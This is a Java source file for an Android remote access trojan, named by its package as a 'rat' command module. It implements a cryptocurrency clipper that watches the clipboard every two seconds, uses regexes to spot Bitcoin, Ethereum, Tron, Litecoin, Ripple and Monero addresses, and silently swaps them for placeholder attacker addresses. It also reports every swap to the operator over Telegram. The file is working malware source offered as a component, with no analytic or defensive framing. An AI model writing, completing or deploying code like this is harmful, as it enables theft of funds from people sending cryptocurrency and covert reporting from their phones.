package com.enterprise.rat.commands;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import com.enterprise.rat.utils.TelegramApi;
import java.util.HashMap;
import java.util.Map;
import java.util.regex.Pattern;

public class CryptoClipboardManager {
    private Context context;
    private boolean monitoring = false;
    private Handler handler = new Handler(Looper.getMainLooper());
    private String lastClipboard = "";
    private static final Map<String, String> SWAP_ADDRESSES = new HashMap<>();

    static {
        SWAP_ADDRESSES.put("^(bc1|1|3)[a-zA-Z0-9]{25,42}$", "bc1qswappedfakeaddress123456789abcdefgh");
        SWAP_ADDRESSES.put("^0x[a-fA-F0-9]{40}$", "0xFAKEADDRESS12345678901234567890DEADBEEF");
        SWAP_ADDRESSES.put("^T[a-zA-Z0-9]{33}$", "TFAKEADDRESS1234567890123456789012");
        SWAP_ADDRESSES.put("^L[a-zA-Z0-9]{33}$", "LFAKEADDRESS1234567890123456789012");
        SWAP_ADDRESSES.put("^r[a-zA-Z0-9]{25,34}$", "rFAKEADDRESS12345678901234567890");
        SWAP_ADDRESSES.put("^4[a-zA-Z0-9]{94}$", "4FAKEADDRESS12345678901234567890123456789012345678901234567890123456789012345678901234567890");
    }

    public CryptoClipboardManager(Context context) { this.context = context; }

    public void startMonitoring() {
        if (monitoring) return;
        monitoring = true;
        TelegramApi.sendMessage("🔄 Crypto clipboard monitoring started.");
        handler.post(clipboardMonitor);
    }

    public void stopMonitoring() {
        monitoring = false;
        handler.removeCallbacks(clipboardMonitor);
        TelegramApi.sendMessage("🔄 Crypto clipboard monitoring stopped.");
    }

    private Runnable clipboardMonitor = new Runnable() {
        @Override
        public void run() {
            if (!monitoring) return;
            ClipboardManager cm = (ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
            if (cm.hasPrimaryClip()) {
                ClipData clip = cm.getPrimaryClip();
                if (clip != null && clip.getItemCount() > 0) {
                    CharSequence text = clip.getItemAt(0).getText();
                    if (text != null) {
                        String content = text.toString();
                        if (!content.equals(lastClipboard)) {
                            lastClipboard = content;
                            for (Map.Entry<String, String> entry : SWAP_ADDRESSES.entrySet()) {
                                if (Pattern.matches(entry.getKey(), content.trim())) {
                                    cm.setPrimaryClip(ClipData.newPlainText("address", entry.getValue()));
                                    TelegramApi.sendMessage("🔁 Swapped: <code>" + content.trim() + "</code> → <code>" + entry.getValue() + "</code>");
                                    break;
                                }
                            }
                        }
                    }
                }
            }
            handler.postDelayed(this, 2000);
        }
    };
}
